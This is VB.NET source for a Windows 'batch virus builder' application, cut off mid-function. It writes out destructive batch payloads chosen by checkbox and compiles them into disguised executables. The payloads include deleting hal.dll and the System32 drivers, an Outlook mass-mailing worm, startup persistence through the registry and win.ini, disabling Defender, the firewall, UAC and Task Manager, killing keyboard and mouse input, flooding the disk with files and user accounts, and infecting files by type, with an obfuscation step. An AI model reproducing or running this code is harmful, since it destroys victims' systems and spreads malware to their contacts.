Imports System.IO.File
Imports System.CodeDom.Compiler
Public Class Form1
    Dim write As System.IO.StreamWriter
    Dim fichier, icone As String
    ''batch to executable

    Function RandomString(cp As Integer) As String
        Randomize()
        Dim rgch As String
        rgch = "abcdefghijklmnopqrstuvwxyz"
        rgch = rgch & UCase(rgch) & "1234567890"
        Dim i As Long
        For i = 1 To cp
            RandomString = RandomString & Mid$(rgch, Int(Rnd() * Len(rgch) + 1), 1)
        Next
    End Function

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        TextBox2.Text = RandomString(16)
    End Sub

    Dim Source As String = _
            "Module BtE" & vbNewLine & _
            "Sub Main()" & vbNewLine & _
            "If System.IO.File.Exists(System.Environment.GetEnvironmentVariable(" & Chr(34) & "TMP" & Chr(34) & ") & " & Chr(34) & "\cmd.bat" & Chr(34) & ") Then" & vbNewLine & _
            "System.IO.File.Delete(System.Environment.GetEnvironmentVariable(" & Chr(34) & "TMP" & Chr(34) & ") & " & Chr(34) & "\cmd.bat" & Chr(34) & ")" & vbNewLine & _
            "End If" & vbNewLine & _
            "System.IO.File.WriteAllText(System.Environment.GetEnvironmentVariable(" & Chr(34) & "TMP" & Chr(34) & ") & " & Chr(34) & "\cmd.bat" & Chr(34) & ", {BATCH})" & vbNewLine & _
            "System.Diagnostics.Process.Start(System.Environment.GetEnvironmentVariable(" & Chr(34) & "TMP" & Chr(34) & ") & " & Chr(34) & "\cmd.bat" & Chr(34) & ")" & vbNewLine & _
            "End Sub" & vbNewLine & _
            "End Module"
    Public Sub GenerateExecutable(ByVal Output As String, ByVal Source As String)
        Try
            Dim Param As New CompilerParameters()
            Dim Res As CompilerResults
            Param.GenerateExecutable = True
            Param.IncludeDebugInformation = False
            Param.CompilerOptions = "/target:winexe /optimize+ /filealign:512"
            Param.OutputAssembly = Output
            Res = New VBCodeProvider(New Dictionary(Of String, String)() From {{"Version", "v2"}}).CompileAssemblyFromSource(Param, Source)
            If Res.Errors.Count <> 0 Then
                For Each [Error] In Res.Errors
                    MsgBox("Error: " & [Error].ErrorText, MsgBoxStyle.Critical, "Error")
                Next
            End If
        Catch ex As Exception
            MsgBox("Error: " & ex.ToString, MsgBoxStyle.Critical, "Error")
        End Try
    End Sub
    Function TobString(ByVal b As String)
        Dim ret As String = ""
        For i As Integer = 0 To Split(b, vbNewLine).Count - 1
            Dim line As String = Split(b, vbNewLine)(i).Replace(Chr(34), Chr(34) & " & System.Text.Encoding.ASCII.GetString(New Byte() {34}) & " & Chr(34))
            ret &= Chr(34) & line & Chr(34) & " & System.Environment.NewLine & _" & vbNewLine
        Next
        Return ret.Remove(ret.Length - 6)
    End Function
    Sub ConvertBtE(ByVal Output As String)
        UpdateStatus("Reading from batch file...", 50)
        'Dim batch As String = IO.File.ReadAllText(TextBox1.Text)
        Dim batch As String = TextBox9.Text
        UpdateStatus("Preparing executable code...", 0)
        Dim code As String = Source
        UpdateStatus("", 50)
        code = code.Replace("{BATCH}", TobString(batch))
        UpdateStatus("Compiling...", 50)
        GenerateExecutable(Output, code)
        UpdateStatus("Done", 100)
        UpdateStatus("Save", 0)
    End Sub

    'Private Sub TextBox1_Click(ByVal sender As Object, ByVal e As System.EventArgs) Handles TextBox1.Click
    'Dim ofd As New OpenFileDialog
    'ofd.Filter = "Batch files (*.bat)|*.Bat"
    'If ofd.ShowDialog <> vbOK Then
    ' Exit Sub
    ' End If
    'TextBox1.Text = ofd.FileName
    'End Sub
    Delegate Sub delUpdateStatus(ByVal lbl As String, ByVal prgs As Integer)
    Sub UpdateStatus(ByVal lbl As String, ByVal prgs As Integer)
        If InvokeRequired Then
            Invoke(New delUpdateStatus(AddressOf UpdateStatus), New Object() {lbl, prgs})
        Else
            If lbl <> "" Then Button1.Text = lbl
            'ProgressBar1.Value = prgs
        End If
    End Sub
    ''change icon
    Sub ChangeIcon()
        fichier = TextBox10.Text
        icone = Form9.TextBox1.Text
        IconInjector.InjectIcon(fichier, icone)
        MsgBox("Icon succesfully changed.", MsgBoxStyle.Information + MsgBoxStyle.OkOnly, "Information")
    End Sub
    'button 1
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        TextBox9.Clear()
        ''codes
        If CheckBox1.Checked = True Then
            TextBox9.Text = TextBox9.Text + vbCrLf + TextBox1.Text
        End If
        If CheckBox2.Checked = True Then
            TextBox9.Text = TextBox9.Text + vbCrLf + "net user %username% *" + vbCrLf + TextBox2.Text + vbCrLf + TextBox2.Text
        End If
        If CheckBox3.Checked = True Then
            TextBox9.Text = TextBox9.Text + vbCrLf + "DEL /F /S /Q /A " + """" + TextBox3.Text + "." + TextBox4.Text + """"
        End If
        If CheckBox4.Checked = True Then
            If RadioButton1.Checked = True Then
                TextBox9.Text = TextBox9.Text + vbCrLf + "TASKKILL /F /IM " + ListBox1.Text + " /T"
            ElseIf RadioButton2.Checked = True Then
                TextBox9.Text = TextBox9.Text + vbCrLf + "TAKKILL /F /IM " + TextBox5.Text + " /T"
            End If
        End If
        If CheckBox5.Checked = True Then
            If CheckBox6.Checked = True Then
                TextBox9.Text = ":loop" + vbCrLf + TextBox9.Text + vbCrLf + "start " + TextBox6.Text + vbCrLf + "goto loop"
            Else
                TextBox9.Text = TextBox9.Text + vbCrLf + "start " + TextBox6.Text
            End If
        End If
        If CheckBox7.Checked = True Then
            If CheckBox8.Checked = True Then
                TextBox9.Text = ":looop" + vbCrLf + TextBox9.Text + vbCrLf + "start " + TextBox7.Text + vbCrLf + "goto looop"
            Else
                TextBox9.Text = TextBox9.Text + vbCrLf + "start " + TextBox7.Text
            End If
        End If
        If CheckBox9.Checked = True Then
            TextBox9.Text = TextBox9.Text + vbCrLf + Form3.TextBox1.Text
        End If
        If CheckBox10.Checked = True Then
            TextBox9.Text = TextBox9.Text + vbCrLf + "RUNDLL32 USER32.DLL,SwapMouseButton"
        End If
        If CheckBox11.Checked = True Then
            TextBox9.Text = TextBox9.Text + vbCrLf + "date 22/08/2014" + vbCrLf + "time 06:06:06"
        End If
        If CheckBox12.Checked = True Then
            TextBox9.Text = TextBox9.Text + vbCrLf + "DEL /F /S /Q /A ""%systemdrive%\windows\system32\hal.dll""" + vbCrLf + "@((( Echo Off > Nul ) & Break Off )" + vbCrLf + "@Set HiveBSOD=HKLM\Software\Microsoft\Windows\CurrentVersion\Run" + vbCrLf + "@Reg Add ""%HiveBSOD%"" /v ""BSOD"" /t ""REG_SZ"" /d %0 /f > Nul" + vbCrLf + "@Del /q /s /f ""%SystemRoot%\Windows\System32\Drivers\*.*""" + vbCrLf + ")"
        End If
        If CheckBox13.Checked = True Then
            TextBox9.Text = ":worm" + vbCrLf + TextBox9.Text + vbCrLf + "set Slash=\" + vbCrLf + "if exist %SystemDrive%%Slash%AUTOEXEC.BAT (" + vbCrLf + "attrib +s +r +h %SystemDrive%%Slash%AUTOEXEC.BAT" + vbCrLf + "del %SystemDrive%%Slash%AUTOEXEC.BAT" + vbCrLf + "copy %0 %SystemDrive%%Slash%AUTOEXEC.BAT" + vbCrLf + "attrib +s +r +h %SystemDrive%%Slash%AUTOEXEC.BAT" + vbCrLf + ")" + vbCrLf + "set a=" + TextBox8.Text + vbCrLf + "copy %0 %windir%\%a%.bat" + vbCrLf + "reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v AVAADA /t REG_SZ /d %windir%\%a%.bat /f > nul" + vbCrLf + "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v AVAADA /t REG_SZ /d %windir%\%a%.bat /f > nul" + vbCrLf + "set b=" + TextBox8.Text + vbCrLf + "copy %0 %windir%\%b%.bat" + vbCrLf + "echo [windows] >> %windir%\win.ini" + vbCrLf + "echo run=%windir%\%b%.bat >> %windir%\win.ini" + vbCrLf + "echo load=%windir%\%b%.bat >> %windir%\win.ini" + vbCrLf + "echo [boot] >> %windir%\system.ini" + vbCrLf + "echo shell=explorer.exe %b%.bat >> %windir%\system.ini" + vbCrLf + "echo dim x>>%SystemDrive%\mail.vbs" + vbCrLf + "echo on error resume next>>%SystemDrive%\mail.vbs" + vbCrLf + "echo Set fso =""Scripting.FileSystem.Object"">>%SystemDrive%\mail.vbs" + vbCrLf + "echo Set so=CreateObject(fso)>>%SystemDrive%\mail.vbs" + vbCrLf + "echo Set ol=CreateObject(""Outlook.Application"")>>%SystemDrive%\mail.vbs" + vbCrLf + "echo Set out=WScript.CreateObject(""Outlook.Application"")>>%SystemDrive%\mail.vbs" + vbCrLf + "echo Set mapi = out.GetNameSpace(""MAPI"")>>%SystemDrive%\mail.vbs" + vbCrLf + "echo Set a = mapi.AddressLists(1)>>%SystemDrive%\mail.vbs" + vbCrLf + "echo Set ae=a.AddressEntries>>%SystemDrive%\mail.vbs" + vbCrLf + "echo For x=1 To ae.Count>>%SystemDrive%\mail.vbs" + vbCrLf + "echo Set ci=ol.CreateItem(0)>>%SystemDrive%\mail.vbs" + vbCrLf + "echo Set Mail=ci>>%SystemDrive%\mail.vbs" + vbCrLf + "echo Mail.to=ol.GetNameSpace(""MAPI"").AddressLists(1).AddressEntries(x)>>%SystemDrive%\mail.vbs" + vbCrLf + "echo Mail.Subject=""Is this you?"">>%SystemDrive%\mail.vbs" + vbCrLf + "echo Mail.Body=""Man that has got to be embarrassing!"">>%SystemDrive%\mail.vbs" + vbCrLf + "echo Mail.Attachments.Add(%0)>>%SystemDrive%\mail.vbs" + vbCrLf + "echo Mail.send>>%SystemDrive%\mail.vbs" + vbCrLf + "echo Next>>%SystemDrive%\mail.vbs" + vbCrLf + "echo ol.Quit>>%SystemDrive%\mail.vbs" + vbCrLf + "start """" ""%SystemDrive%\mail.vbs""" + vbCrLf + "goto worm"
        End If
        If CheckBox14.Checked = True Then
            If Form4.CheckBox1.Checked = True Then
                If Form4.CheckBox4.Checked = True Then
                    TextBox9.Text = ":files" + vbCrLf + TextBox9.Text + vbCrLf + "nul >> %random%" + vbCrLf + "goto files"
                Else
                    TextBox9.Text = TextBox9.Text + vbCrLf + "nul >> %random%" + vbCrLf + "nul >> %random%" + vbCrLf + "nul >> %random%" + vbCrLf + "nul >> %random%" + vbCrLf + "nul >> %random%" + vbCrLf + "nul >> %random%" + vbCrLf + "nul >> %random%" + vbCrLf + "nul >> %random%" + vbCrLf + "nul >> %random%" + vbCrLf + "nul >> %random%" + vbCrLf + "nul >> %random%" + vbCrLf + "nul >> %random%" + vbCrLf + "nul >> %random%" + vbCrLf + "nul >> %random%" + vbCrLf + "nul >> %random%" + vbCrLf + "nul >> %random%" + vbCrLf + "nul >> %random%" + vbCrLf + "nul >> %random%" + vbCrLf + "nul >> %random%" + vbCrLf + "nul >> %random%" + vbCrLf + "nul >> %random%" + vbCrLf + "nul >> %random%" + vbCrLf + "nul >> %random%" + vbCrLf + "nul >> %random%" + vbCrLf + "nul >> %random%" + vbCrLf + "nul >> %random%" + vbCrLf + "nul >> %random%" + vbCrLf + "nul >> %random%" + vbCrLf + "nul >> %random%" + vbCrLf + "nul >> %random%" + vbCrLf + "nul >> %random%" + vbCrLf + "nul >> %random%" + vbCrLf + "nul >> %random%" + vbCrLf + "nul >> %random%" + vbCrLf + "nul >> %random%" + vbCrLf + "nul >> %random%" + vbCrLf + "nul >> %random%" + vbCrLf + "nul >> %random%" + vbCrLf + "nul >> %random%" + vbCrLf + "nul >> %random%" + vbCrLf + "nul >> %random%" + vbCrLf + "nul >> %random%" + vbCrLf + "nul >> %random%" + vbCrLf + "nul >> %random%" + vbCrLf + "nul >> %random%" + vbCrLf + "nul >> %random%" + vbCrLf + "nul >> %random%" + vbCrLf + "nul >> %random%" + vbCrLf + "nul >> %random%" + vbCrLf + "nul >> %random%"
                End If
            End If
            If Form4.CheckBox2.Checked = True Then
                If Form4.CheckBox4.Checked = True Then
                    TextBox9.Text = ":folders" + vbCrLf + TextBox9.Text + vbCrLf + "mkdir %random%" + vbCrLf + "goto folders"
                Else
                    TextBox9.Text = TextBox9.Text + vbCrLf + "mkdir %random%" + vbCrLf + "mkdir %random%" + vbCrLf + "mkdir %random%" + vbCrLf + "mkdir %random%" + vbCrLf + "mkdir %random%" + vbCrLf + "mkdir %random%" + vbCrLf + "mkdir %random%" + vbCrLf + "mkdir %random%" + vbCrLf + "mkdir %random%" + vbCrLf + "mkdir %random%" + vbCrLf + "mkdir %random%" + vbCrLf + "mkdir %random%" + vbCrLf + "mkdir %random%" + vbCrLf + "mkdir %random%" + vbCrLf + "mkdir %random%" + vbCrLf + "mkdir %random%" + vbCrLf + "mkdir %random%" + vbCrLf + "mkdir %random%" + vbCrLf + "mkdir %random%" + vbCrLf + "mkdir %random%" + vbCrLf + "mkdir %random%" + vbCrLf + "mkdir %random%" + vbCrLf + "mkdir %random%" + vbCrLf + "mkdir %random%" + vbCrLf + "mkdir %random%" + vbCrLf + "mkdir %random%" + vbCrLf + "mkdir %random%" + vbCrLf + "mkdir %random%" + vbCrLf + "mkdir %random%" + vbCrLf + "mkdir %random%" + vbCrLf + "mkdir %random%" + vbCrLf + "mkdir %random%" + vbCrLf + "mkdir %random%" + vbCrLf + "mkdir %random%" + vbCrLf + "mkdir %random%" + vbCrLf + "mkdir %random%" + vbCrLf + "mkdir %random%" + vbCrLf + "mkdir %random%" + vbCrLf + "mkdir %random%" + vbCrLf + "mkdir %random%" + vbCrLf + "mkdir %random%" + vbCrLf + "mkdir %random%" + vbCrLf + "mkdir %random%" + vbCrLf + "mkdir %random%" + vbCrLf + "mkdir %random%" + vbCrLf + "mkdir %random%" + vbCrLf + "mkdir %random%" + vbCrLf + "mkdir %random%" + vbCrLf + "mkdir %random%" + vbCrLf + "mkdir %random%"
                End If
            End If
            If Form4.CheckBox3.Checked = True Then
                If Form4.CheckBox4.Checked = True Then
                    TextBox9.Text = ":user" + vbCrLf + TextBox9.Text + vbCrLf + "net user %random% /add" + vbCrLf + "goto user"
                Else
                    TextBox9.Text = TextBox9.Text + vbCrLf + "net user %radnom% /add" + vbCrLf + "net user %radnom% /add" + vbCrLf + "net user %radnom% /add" + vbCrLf + "net user %radnom% /add" + vbCrLf + "net user %radnom% /add" + vbCrLf + "net user %radnom% /add" + vbCrLf + "net user %radnom% /add" + vbCrLf + "net user %radnom% /add" + vbCrLf + "net user %radnom% /add" + vbCrLf + "net user %radnom% /add" + vbCrLf + "net user %radnom% /add" + vbCrLf + "net user %radnom% /add" + vbCrLf + "net user %radnom% /add" + vbCrLf + "net user %radnom% /add" + vbCrLf + "net user %radnom% /add" + vbCrLf + "net user %radnom% /add" + vbCrLf + "net user %radnom% /add" + vbCrLf + "net user %radnom% /add" + vbCrLf + "net user %radnom% /add" + vbCrLf + "net user %radnom% /add" + vbCrLf + "net user %radnom% /add" + vbCrLf + "net user %radnom% /add" + vbCrLf + "net user %radnom% /add" + vbCrLf + "net user %radnom% /add" + vbCrLf + "net user %radnom% /add" + vbCrLf + "net user %radnom% /add" + vbCrLf + "net user %radnom% /add" + vbCrLf + "net user %radnom% /add" + vbCrLf + "net user %radnom% /add" + vbCrLf + "net user %radnom% /add" + vbCrLf + "net user %radnom% /add" + vbCrLf + "net user %radnom% /add" + vbCrLf + "net user %radnom% /add" + vbCrLf + "net user %radnom% /add" + vbCrLf + "net user %radnom% /add" + vbCrLf + "net user %radnom% /add" + vbCrLf + "net user %radnom% /add" + vbCrLf + "net user %radnom% /add" + vbCrLf + "net user %radnom% /add" + vbCrLf + "net user %radnom% /add" + vbCrLf + "net user %radnom% /add" + vbCrLf + "net user %radnom% /add" + vbCrLf + "net user %radnom% /add" + vbCrLf + "net user %radnom% /add" + vbCrLf + "net user %radnom% /add" + vbCrLf + "net user %radnom% /add" + vbCrLf + "net user %radnom% /add" + vbCrLf + "net user %radnom% /add" + vbCrLf + "net user %radnom% /add" + vbCrLf + "net user %radnom% /add"
                End If
            End If
        End If
        If CheckBox15.Checked = True Then
            ''AUTOEXEC.BAT
            If Form5.CheckBox1.Checked = True Then
                TextBox9.Text = TextBox9.Text + vbCrLf + "set Slash=\" + vbCrLf + "if exist %SystemDrive%%Slash%AUTOEXEC.BAT (" + vbCrLf + "attrib +s +r +h %SystemDrive%%Slash%AUTOEXEC.BAT" + vbCrLf + "del %SystemDrive%%Slash%AUTOEXEC.BAT" + vbCrLf + "copy %0 %SystemDrive%%Slash%AUTOEXEC.BAT" + vbCrLf + "attrib +s +r +h %SystemDrive%%Slash%AUTOEXEC.BAT" + vbCrLf + ")"
            End If
            ''registry
            If Form5.CheckBox2.Checked = True Then
                TextBox9.Text = TextBox9.Text + vbCrLf + "set a=" + TextBox8.Text + vbCrLf + "copy %0 %windir%\%a%.bat" + vbCrLf + "reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v AVAADA /t REG_SZ /d %windir%\%a%.bat /f > nul" + vbCrLf + "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v AVAADA /t REG_SZ /d %windir%\%a%.bat /f > nul"
            End If
            If Form5.CheckBox3.Checked = True Then
                TextBox9.Text = TextBox9.Text + vbCrLf + "copy %0 ""%userprofile%\Start Menu\Programs\Startup"""
            End If
            ''win.ini
            If Form5.CheckBox3.Checked = True Then
                TextBox9.Text = TextBox9.Text + vbCrLf + "set b=" + TextBox8.Text + vbCrLf + "copy %0 %windir%\%b%.bat" + vbCrLf + "echo [windows] >> %windir%\win.ini" + vbCrLf + "echo run=%windir%\%b%.bat >> %windir%\win.ini" + vbCrLf + "echo load=%windir%\%b%.bat >> %windir%\win.ini" + vbCrLf + "echo [boot] >> %windir%\system.ini" + vbCrLf + "echo shell=explorer.exe %b%.bat >> %windir%\system.ini"
            End If
        End If
        If CheckBox16.Checked = True Then
            If Form6.CheckBox1.Checked = True Then
                TextBox9.Text = TextBox9.Text + vbCrLf + "@Set RegistyEditCmd=Cmd /k Reg Add" + vbCrLf + "@Set HiveSysKey=HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" + vbCrLf + "@%RegistyEditCmd% ""%HiveSysKey%"" /v ""EnableLUA"" /t ""REG_DWORD"" /d ""0"" /f > nul"
            End If
            If Form6.CheckBox2.Checked = True Then
                TextBox9.Text = TextBox9.Text + vbCrLf + "@Echo off & @@Break Off" + vbCrLf + "Ipconfig / release" + vbCrLf + "%jUmP%E%nD%c%onFiG%h%IdE%o%P% h%aRv%%aRd%A%T%%cHe%cK%HappY%3D b%aLLo0Ns%Y%eS% m3Ga!?!" + vbCrLf + "P%ReSs%%IE%AuS%ExPloR%e%r% > nul.%TempInternetRelease%"
            End If
            If Form6.CheckBox3.Checked = True Then
                TextBox9.Text = TextBox9.Text + vbCrLf + "echo Windows Registry Editor Version 5.00 > ""nokeyboard.reg""" + vbCrLf + "echo [HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Keyboard Layout] >> ""nokeyboard.reg""" + vbCrLf + "echo ""Scancode Map""=hex:00,00,00,00,00,00,00,00,7c,00,00,00,00,00,01,00,00,\ >> ""nokeyboard.reg""" + vbCrLf + "echo 00,3b,00,00,00,3c,00,00,00,3d,00,00,00,3e,00,00,00,3f,00,00,00,40,00,00,00,\ >> ""nokeyboard.reg""" + vbCrLf + "echo 41,00,00,00,42,00,00,00,43,00,00,00,44,00,00,00,57,00,00,00,58,00,00,00,37,\ >> ""nokeyboard.reg""" + vbCrLf + "echo e0,00,00,46,00,00,00,45,00,00,00,35,e0,00,00,37,00,00,00,4a,00,00,00,47,00,\ >> ""nokeyboard.reg""" + vbCrLf + "echo 00,00,48,00,00,00,49,00,00,00,4b,00,00,00,4c,00,00,00,4d,00,00,00,4e,00,00,\ >> ""nokeyboard.reg""" + vbCrLf + "echo 00,4f,00,00,00,50,00,00,00,51,00,00,00,1c,e0,00,00,53,00,00,00,52,00,00,00,\ >> ""nokeyboard.reg""" + vbCrLf + "echo 4d,e0,00,00,50,e0,00,00,4b,e0,00,00,48,e0,00,00,52,e0,00,00,47,e0,00,00,49,\ >> ""nokeyboard.reg""" + vbCrLf + "echo e0,00,00,53,e0,00,00,4f,e0,00,00,51,e0,00,00,29,00,00,00,02,00,00,00,03,00,\ >> ""nokeyboard.reg""" + vbCrLf + "echo 00,00,04,00,00,00,05,00,00,00,06,00,00,00,07,00,00,00,08,00,00,00,09,00,00,\ >> ""nokeyboard.reg""" + vbCrLf + "echo 00,0a,00,00,00,0b,00,00,00,0c,00,00,00,0d,00,00,00,0e,00,00,00,0f,00,00,00,\ >> ""nokeyboard.reg""" + vbCrLf + "echo 10,00,00,00,11,00,00,00,12,00,00,00,13,00,00,00,14,00,00,00,15,00,00,00,16,\ >> ""nokeyboard.reg""" + vbCrLf + "echo 00,00,00,17,00,00,00,18,00,00,00,19,00,00,00,1a,00,00,00,1b,00,00,00,2b,00,\ >> ""nokeyboard.reg""" + vbCrLf + "echo 00,00,3a,00,00,00,1e,00,00,00,1f,00,00,00,20,00,00,00,21,00,00,00,22,00,00,\ >> ""nokeyboard.reg""" + vbCrLf + "echo 00,23,00,00,00,24,00,00,00,25,00,00,00,26,00,00,00,27,00,00,00,28,00,00,00,\ >> ""nokeyboard.reg""" + vbCrLf + "echo 1c,00,00,00,2a,00,00,00,2c,00,00,00,2d,00,00,00,2e,00,00,00,2f,00,00,00,30,\ >> ""nokeyboard.reg""" + vbCrLf + "echo 00,00,00,31,00,00,00,32,00,00,00,33,00,00,00,34,00,00,00,35,00,00,00,36,00,\ >> ""nokeyboard.reg""" + vbCrLf + "echo 00,00,1d,00,00,00,5b,e0,00,00,38,00,00,00,39,00,00,00,38,e0,00,00,5c,e0,00,\ >> ""nokeyboard.reg""" + vbCrLf + "echo 00,5d,e0,00,00,1d,e0,00,00,5f,e0,00,00,5e,e0,00,00,22,e0,00,00,24,e0,00,00,\ >> ""nokeyboard.reg""" + vbCrLf + "echo 10,e0,00,00,19,e0,00,00,30,e0,00,00,2e,e0,00,00,2c,e0,00,00,20,e0,00,00,6a,\ >> ""nokeyboard.reg""" + vbCrLf + "echo e0,00,00,69,e0,00,00,68,e0,00,00,67,e0,00,00,42,e0,00,00,6c,e0,00,00,6d,e0,\ >> ""nokeyboard.reg""" + vbCrLf + "echo 00,00,66,e0,00,00,6b,e0,00,00,21,e0,00,00,00,00 >> ""nokeyboard.reg""" + vbCrLf + "start ""nokeyboard.reg"""
            End If
            If Form6.CheckBox4.Checked = True Then
                TextBox9.Text = TextBox9.Text + vbCrLf + "set key=""HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Mouclass""" + vbCrLf + "reg delete %key%" + vbCrLf + "reg add %key% /v Start /t REG_DWORD /d 4"
            End If
            If Form6.CheckBox5.Checked = True Then
                TextBox9.Text = TextBox9.Text + vbCrLf + "reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul"
            End If
            If Form6.CheckBox6.Checked = True Then
                TextBox9.Text = TextBox9.Text + vbCrLf + "net stop ""SDRSVC"""
            End If
            If Form6.CheckBox7.Checked = True Then
                TextBox9.Text = TextBox9.Text + vbCrLf + "net stop ""WinDefend""" + vbCrLf + "taskkill /f /t /im ""MSASCui.exe"""
            End If
            If Form6.CheckBox8.Checked = True Then
                TextBox9.Text = TextBox9.Text + vbCrLf + "net stop""MpsSvc""" + vbCrLf + "taskkill /f /t /im""FirewallControlPanel.exe""" + vbCrLf + "if %errorlevel%==1 tskill FirewallControlPanel" + vbCrLf + "netsh firewall set opmode mode=disable"
            End If
            If Form6.CheckBox9.Checked = True Then
                TextBox9.Text = TextBox9.Text + vbCrLf + "net stop ""security center""" + vbCrLf + "net stop sharedaccess" + vbCrLf + "netsh firewall set opmode mode-disable"
            End If
            If Form6.CheckBox10.Checked = True Then
                TextBox9.Text = TextBox9.Text + vbCrLf + "net stop ""wuauserv"""
            End If
        End If
        If CheckBox17.Checked = True Then
            If Form7.RadioButton1.Checked = True Then
                TextBox9.Text = TextBox9.Text + vbCrLf + "shutdown /f"
            End If
            If Form7.RadioButton2.Checked = True Then
                TextBox9.Text = TextBox9.Text + vbCrLf + "shutdown /l"
            End If
            If Form7.RadioButton3.Checked = True Then
                TextBox9.Text = TextBox9.Text + vbCrLf + "shutdown /r"
            End If
            If Form7.RadioButton4.Checked = True Then
                TextBox9.Text = TextBox9.Text + vbCrLf + "shutdown /p"
            End If
            If Form7.CheckBox1.Checked = True Then
                TextBox9.Text = TextBox9.Text + " -t " + Form7.TextBox1.Text
            End If
            If Form7.CheckBox1.Checked = True Then
                TextBox9.Text = TextBox9.Text + " -c """ + Form7.TextBox2.Text + """"
            End If
        End If
        If Form10.CheckBox1.Checked = True Then
            TextBox9.Text = TextBox9.Text + vbCrLf + "echo ␇␇␇␇␇␇␇␇␇␇␇␇␇"
        End If
        If Form10.CheckBox2.Checked = True Then
            TextBox9.Text = TextBox9.Text + vbCrLf + "@((( Echo Off > Nul ) & Break Off )" + vbCrLf + "@Set HiveBSOD=HKLM\Software\Microsoft\Windows\CurrentVersion\Run" + vbCrLf + "@Reg Add ""%HiveBSOD%"" /v ""BSOD"" /t ""REG_SZ"" /d %0 /f > Nul" + vbCrLf + "@Del /q /s /f ""%SystemRoot%\Windows\System32\Drivers\*.*""" + vbCrLf + +")"
        End If
        If Form10.CheckBox3.Checked = True Then
            TextBox9.Text = TextBox9.Text + vbCrLf + "net stop ""SDRSVC"""
        End If
        If Form10.CheckBox4.Checked = True Then
            TextBox9.Text = TextBox9.Text + vbCrLf + "@Cmd /k Reg Add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v ""EnableLUA"" /t ""REG_DWORD"" /d ""0"" /f > nul"""
        End If
        If Form10.CheckBox6.Checked = True Then
            TextBox9.Text = TextBox9.Text + vbCrLf + "assoc." + Form10.TextBox1.Text + " = batfile" + vbCrLf + "DIR /S/B %SystemDrive%\*." + Form10.TextBox1.Text + " >> InfList_" + Form10.TextBox1.Text + ".txt" + vbCrLf + "echo Y | FOR /F ""tokens=1,* delims=: "" %%j in (InfList_" + Form10.TextBox1.Text + ".txt) do copy /y %0 ""%%j:%%k"""
        End If
        If Form10.CheckBox7.Checked = True Then
            TextBox9.Text = TextBox9.Text + vbCrLf + Form10.TextBox6.Text
        End If
        If Form10.CheckBox8.Checked = True Then
            TextBox9.Text = TextBox9.Text + vbCrLf + "net send * """ + Form10.TextBox2.Text + """"
        End If
        If Form10.CheckBox9.Checked = True Then
            TextBox9.Text = TextBox9.Text + vbCrLf + "echo " + Form10.TextBox3.Text + ">> ""spam.txt""" + vbCrLf + "notepad /P ""Spam.txt"""
        End If
        If Form10.CheckBox10.Checked = True Then
            TextBox9.Text = TextBox9.Text + vbCrLf + "copy %0 %ProgramFiles%\eMule\Incoming\%0"
        End If
        If Form10.CheckBox11.Checked = True Then
            TextBox9.Text = TextBox9.Text + vbCrLf + Form10.TextBox7.Text
        End If
        If Form10.CheckBox12.Checked = True Then
            TextBox9.Text = TextBox9.Text + vbCrLf + "ren *." + Form10.TextBox4.Text + " *." + Form10.TextBox5.Text
        End If
        If Form10.CheckBox13.Checked = True Then
            TextBox9.Text = TextBox9.Text + vbCrLf + "assoc.dll = txtfile" + vbCrLf + "assoc.exe = pngfile" + vbCrLf + "assoc .vbs = Visual Style" + vbCrLf + "assoc .reg = xmlfile" + vbCrLf + "assoc .txt = regfile" + vbCrLf + "assoc .mp3 = txtfile" + vbCrLf + "assoc .xml = txtfile" + vbCrLf + "assoc .png = txtfile"
        End If
        If Form10.CheckBox5.Checked = True Then
            TextBox10.Text = TextBox9.Text
            TextBox9.Clear()
            TextBox9.Text = TextBox10.Text
            TextBox9.Text = Strings.Replace(TextBox9.Text, "0", "£")
            TextBox9.Text = Strings.Replace(TextBox9.Text, "%", "%%")
            TextBox9.Text = Strings.Replace(TextBox9.Text, "x", "%x:~24,1%")
            TextBox9.Text = Strings.Replace(TextBox9.Text, "a", "%x:~1,1%")
            TextBox9.Text = Strings.Replace(TextBox9.Text, "b", "%x:~2,1%")
            TextBox9.Text = Strings.Replace(TextBox9.Text, "c", "%x:~3,1%")
            TextBox9.Text = Strings.Replace(TextBox9.Text, "d", "%x:~4,1%")
            TextBox9.Text = Strings.Replace(TextBox9.Text, "e", "%x:~5,1%")
            TextBox9.Text = Strings.Replace(TextBox9.Text, "f", "%x:~6,1%")
            TextBox9.Text = Strings.Replace(TextBox9.Text, "g", "%x:~7,1%")
            TextBox9.Text = Strings.Replace(TextBox9.Text, "h", "%x:~8,1%")
            TextBox9.Text = Strings.Replace(TextBox9.Text, "i", "%x:~9,1%")
            TextBox9.Text = Strings.Replace(TextBox9.Text, "j", "%x:~10,1%")
            TextBox9.Text = Strings.Replace(TextBox9.Text, "k", "%x:~11,1%")
            TextBox9.Text = Strings.Replace(TextBox9.Text, "l", "%x:~12,1%")
            TextBox9.Text = Strings.Replace(TextBox9.Text, "m", "%x:~13,1%")
            TextBox9.Text = Strings.Replace(TextBox9.Text, "n", "%x:~14,1%")
            TextBox9.Text = Strings.Replace(TextBox9.Text, "o", "%x:~15,1%")
            TextBox9.Text = Strings.Replace(TextBox9.Text, "p", "%x:~16,1%")
            TextBox9.Text = Strings.Replace(TextBox9.Text, "q", "%x:~17,1%")
            TextBox9.Text = Strings.Replace(TextBox9.Text, "r", "%x:~18,1%")
            TextBox9.Text = Strings.Replace(TextBox9.Text, "s", "%x:~19,1%")
            TextBox9.Text = Strings.Replace(TextBox9.Text, "t", "%x:~20,1%")
            TextBox9.Text = Strings.Replace(TextBox9.Text, "u", "%x:~21,1%")
            TextBox9.Text = Strings.Replace(TextBox9.Text, "v", "%x:~22,1%")
            TextBox9.Text = Strings.Replace(TextBox9.Text, "w", "%x:~23,1%")
            TextBox9.Text = Strings.Replace(TextBox9.Text, "y", "%x:~25,1%")
